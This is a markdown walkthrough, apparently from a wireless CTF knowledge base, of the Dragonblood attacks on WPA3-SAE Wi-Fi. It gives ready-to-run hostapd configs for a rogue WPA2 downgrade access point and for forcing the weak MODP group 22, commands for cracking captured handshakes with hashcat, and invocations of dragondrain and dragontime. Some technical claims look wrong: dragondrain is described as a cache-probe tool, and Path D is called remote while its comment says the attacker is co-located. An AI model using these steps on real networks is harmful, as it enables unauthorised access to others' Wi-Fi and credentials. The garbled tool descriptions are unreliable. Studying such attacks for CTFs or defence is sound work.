# Dragonblood — walkthrough

The 2019 SAE attack family. Companion: `dragonblood-deep/` for the
post-2020 H2E follow-ups. This walkthrough is the launchpad: cache
side channel, timing side channel, MODP downgrade, transition-mode
downgrade.

## Preconditions

- Target AP advertises WPA3-SAE (RSN AKM 8) without SAE-EXT-KEY
  (AKM 24), OR advertises legacy MODP groups (19..21 vs 22..24), OR
  is in transition mode (both AKM 2 and AKM 8).
- Monitor+injection interface.
- For side-channel paths, either co-location with the SAE
  implementation (cache) or the ability to precisely time Commit
  frame arrivals (timing).

## Path A — Transition-mode downgrade (fastest lane)

Same primitive as `wpa3/walkthrough.md` Path A. Stand up a WPA2-only
rogue on the target SSID. Any WPA2-capable client fails over. The
recovered PSK is also the WPA3 password.

```
cat > /tmp/wpa2rogue.conf <<EOF
interface=wlan1
ssid=<TargetSSID>
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=whatever      # placeholder — the client's 4-way is what we want
EOF
hostapd /tmp/wpa2rogue.conf

# Capture and crack (standard WPA2 flow).
hcxpcapngtool -o /tmp/hs.22000 <capture>.pcapng
hashcat -m 22000 /tmp/hs.22000 rockyou.txt
```

## Path B — MODP-group downgrade

The AP negotiates weaker groups if you ask for them. Force group 22
(MODP-1024 approximate).

```
# On the attacker AP:
cat > /tmp/sae-modp.conf <<EOF
interface=wlan1
ssid=<TargetSSID>
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=SAE
rsn_pairwise=CCMP
ieee80211w=2
sae_groups=22                  # ONLY offer MODP-1024
sae_password=<placeholder>
EOF
hostapd /tmp/sae-modp.conf
```

Once the client accepts group 22, its Commit-frame timing exposes
the hunt-and-peck loop iteration count. Use `dragontime`
(companion tool released with the paper) to collect timings.

## Path C — Cache-based side channel (dragondrain)

Requires co-location with the SAE implementation — process on the
same host, or a network-adjacent attacker with cache-observation
capability (rare in a WCTF). Tool ships in
`github.com/vanhoefm/dragonblood-tools`; the co-location cache-probe
flag shape is:

```
./dragondrain --iface wlan1 --mac AA:BB:CC:DD:EE:FF
```

`--mac` is the target AP BSSID whose SAE implementation is being
observed for cache-timing side-channel leakage. Output: per-iteration
bits leaked; brute the remaining passphrase bits offline.

## Path D — Timing side channel (dragontime)

Remote-attacker variant. Requires precise timing of SAE Commit
response.

```
# On attacker STA co-located with the target AP:
./dragontime --iface wlan1 \
             --target AA:BB:CC:DD:EE:FF \
             --ssid <ESSID>

# Output: per-Commit timing samples.
# Analyze offline to recover partial PWE-loop iteration bits.
```

## Which path when

- **Transition-mode signal (AKM 2 + AKM 8)** → Path A. Always.
- **AKM 8 only, no AKM 24, MODP groups on** → Path D (timing).
- **AKM 8 only, no AKM 24, MODP off** → Path B (force MODP), then D.
- **AKM 24 (H2E) present** → Dragonblood-deep or the transition path
  if it exists. Original Dragonblood side channels are gone under
  H2E.

## Failure modes

- **Client refuses WPA2-side downgrade.** Some 2024+ enterprise
  supplicants reject transition-mode APs entirely. Path A closes.
- **AP rejects MODP-only offer.** Modern hostapd defaults refuse to
  negotiate MODP. If the client is willing but the AP isn't, the
  side channel isn't reachable.
- **PMF-required + no way to force reassoc.** Both side channels
  need multiple SAE handshakes to collect samples. Rely on natural
  reassocs or client-initiated roaming.
- **Client's SAE implementation is constant-time by luck.** Some
  supplicants happen to be constant-time even without H2E. Timing
  samples cluster; nothing leaks.

## Cite

- Vanhoef & Ronen 2019 — Dragonblood (IEEE S&P 2020).
- vanhoefm/dragonblood GitHub — dragondrain / dragontime tools.
- CVE-2019-9494 (cache), CVE-2019-9495 (timing).
- attacks.json: `dragonblood-sidechannel`, `dragonblood-timing`,
  `dragonblood-modp-downgrade`, `wpa3-transition-downgrade`.
- Companion: `dragonblood-deep/walkthrough.md`.
